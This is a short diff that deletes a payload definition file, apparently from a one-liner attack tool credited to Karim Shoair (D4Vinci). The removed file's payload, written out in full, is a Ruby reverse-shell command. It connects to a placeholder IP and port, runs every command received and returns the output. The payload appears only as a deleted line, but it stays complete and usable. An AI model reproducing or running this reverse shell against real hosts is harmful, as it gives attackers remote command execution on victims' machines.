@@ -1,7 +1,0 @@
-[Info]
-Author      = Karim shoair (D4Vinci)
-Description = Uses ruby to establish a reverse shell.
-
-[Payload]
-Type     = Reverser
-Payload  = ruby -rsocket -e 'c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
